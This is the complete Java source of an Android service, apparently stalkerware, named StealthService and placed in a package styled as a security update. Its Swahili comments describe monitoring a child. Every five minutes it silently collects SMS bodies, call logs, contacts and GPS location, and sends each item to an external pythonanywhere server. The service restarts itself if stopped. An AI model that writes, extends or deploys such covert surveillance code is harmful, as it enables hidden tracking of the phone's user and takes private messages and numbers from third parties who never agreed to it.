package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        Log.d(TAG, "🔍 StealthService imeanzishwa...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startSurveillance();
        return START_STICKY;
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start immediate data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 0);

        // Schedule periodic data collection every 5 minutes (300000 ms)
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 300000, 300000); // 5 minutes = 300000 ms

        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 5");
    }

    private void collectAndSendAllData() {
        try {
            Log.d(TAG, "🔄 Kuanza kukusanya DATA HALISI...");

            // 1. Kusanya SMS ZOTE za mtoto
            if (checkPermission(Manifest.permission.READ_SMS)) {
                collectAndSendAllSMS();
            }

            // 2. Kusanya SIMU ZOTE za mtoto
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                collectAndSendAllCalls();
            }

            // 3. Kusanya ANWANI ZOTE za mtoto
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                collectAndSendAllContacts();
            }

            // 4. Kusanya LOCATION ya mtoto
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                collectAndSendLocation();
            }

            Log.d(TAG, "✅ Ukusaji wa DATA HALISI umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }

    // 🆕 KUKUSANYA SMS ZOTE
    private void collectAndSendAllSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 100" // SMS 100 za mwisho
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        
                        // Badilisha timestamp kuwa format nzuri
                        String readableDate = convertTimestampToDate(date);
                        
                        // Tuma SMS moja moja
                        JSONObject smsData = new JSONObject();
                        smsData.put("sender", address);
                        smsData.put("message", body);
                        smsData.put("timestamp", readableDate);
                        smsData.put("type", getSMSTypeText(type));

                        sendSingleDataToServer("sms", smsData);
                        count++;
                        
                        // Pumzika kidogo kuepusha overload
                        Thread.sleep(500);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error processing SMS: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ SMS " + count + " zimetumwa kikamilifu");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading SMS: " + e.getMessage());
        }
    }

    // 🆕 KUKUSANYA SIMU ZOTE
    private void collectAndSendAllCalls() {
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100" // Simu 100 za mwisho
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        
                        // Badilisha timestamp
                        String readableDate = convertTimestampToDate(date);
                        
                        // Tuma simu moja moja
                        JSONObject callData = new JSONObject();
                        callData.put("number", number);
                        callData.put("duration", duration + " sekunde");
                        callData.put("timestamp", readableDate);
                        callData.put("type", getCallTypeText(type));

                        sendSingleDataToServer("calls", callData);
                        count++;
                        
                        Thread.sleep(500);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error processing call: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Simu " + count + " zimetumwa kikamilifu");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
        }
    }

    // 🆕 KUKUSANYA ANWANI ZOTE
    private void collectAndSendAllContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        
                        // Pata namba zote za simu za contact hii
                        JSONArray phoneNumbers = getContactAllPhoneNumbers(contactId);
                        
                        if (phoneNumbers.length() > 0) {
                            JSONObject contactData = new JSONObject();
                            contactData.put("name", name);
                            contactData.put("phones", phoneNumbers);
                            contactData.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));

                            sendSingleDataToServer("contacts", contactData);
                            count++;
                            
                            Thread.sleep(500);
                        }
                        
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error processing contact: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Anwani " + count + " zimetumwa kikamilifu");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
        }
    }

    // 🆕 KUKUSANYA LOCATION
    private void collectAndSendLocation() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    JSONObject locationData = new JSONObject();
                    locationData.put("latitude", lastLocation.getLatitude());
                    locationData.put("longitude", lastLocation.getLongitude());
                    locationData.put("accuracy", lastLocation.getAccuracy() + " metres");
                    locationData.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                    locationData.put("provider", "GPS");

                    sendSingleDataToServer("location", locationData);
                    Log.d(TAG, "✅ Location imetumwa kikamilifu");
                } else {
                    Log.d(TAG, "⚠️ Hakuna location data inapatikana");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
        }
    }

    // 🆕 NJIA ZA USAIDIZI
    private JSONArray getContactAllPhoneNumbers(String contactId) {
        JSONArray phones = new JSONArray();
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phones.put(phone);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
        }
        return phones;
    }

    private String convertTimestampToDate(String timestamp) {
        try {
            long time = Long.parseLong(timestamp);
            Date date = new Date(time);
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(date);
        } catch (Exception e) {
            return timestamp;
        }
    }

    private String getSMSTypeText(String type) {
        switch (type) {
            case "1": return "Incoming";
            case "2": return "Outgoing";
            default: return "Unknown";
        }
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "Missed";
            default:
                return "Unknown";
        }
    }

    // 🆕 NJIA YA KUTUMA DATA MOJA MOJA
    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 StealthService imezimwa");
    }
}
